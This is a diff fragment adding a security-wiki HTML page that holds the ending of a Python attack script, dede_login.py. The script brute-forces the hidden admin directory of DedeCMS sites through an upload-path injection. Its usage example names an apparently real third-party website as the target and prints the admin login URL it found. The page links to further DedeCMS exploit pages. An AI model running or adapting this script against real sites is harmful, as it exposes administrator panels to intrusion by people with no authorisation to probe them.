+                                                <span class="c1">#print(&quot;[+] &quot;,back_dir)</span>
+                                                <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s{p}</span><span class="s2">&lt;&lt;/images/adminico.gif&quot;</span><span class="o">%</span><span class="n">prefix</span>
+                                                <span class="k">break</span>
+                                        <span class="k">else</span><span class="p">:</span>
+                                                <span class="n">data</span><span class="p">[</span><span class="s2">&quot;_FILES[tools][tmp_name]&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s{p}</span><span class="s2">&lt;&lt;/images/adminico.gif&quot;</span><span class="o">%</span><span class="n">prefix</span>
+                        <span class="n">show_message</span><span class="p">[</span><span class="s1">&#39;Login_url&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">target</span><span class="o">+</span><span class="s2">&quot;/</span><span class="si">%s</span><span class="s2">&quot;</span><span class="o">%</span><span class="n">back_dir</span>
+
+                        <span class="nb">print</span> <span class="n">show_message</span>
+                        <span class="k">return</span> <span class="n">show_message</span>
+                <span class="k">else</span><span class="p">:</span>
+                        <span class="n">check_message</span><span class="p">[</span><span class="s1">&#39;Enumerate&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+                        <span class="nb">print</span> <span class="n">check_message</span>
+                        <span class="k">return</span> <span class="n">check_message</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+        <span class="n">N</span> <span class="o">=</span> <span class="n">Bute_Login</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">N</span><span class="o">.</span><span class="n">Bute</span><span class="p">()</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">usage:        python .\dede_login.py -u [url]http://www.chuheautism.com[/url]</span>
+<span class="sd">output:</span>
+<span class="sd">                (&#39;testing&#39;, &#39;a&#39;)</span>
+<span class="sd">                (&#39;testing&#39;, &#39;b&#39;)</span>
+<span class="sd">                (&#39;testing&#39;, &#39;c&#39;)</span>
+<span class="sd">                {&#39;Login_url&#39;: &#39;http://www.chuheautism.com/cha&#39;}</span>
+
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;-u&quot;</span><span class="p">:</span>
+                <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88CVE-2018-20129%EF%BC%89Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2018-20129）Dedecms前台文件上传漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/" class="btn btn-xs btn-link">
+        Dedecms swf文件反射型xss
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
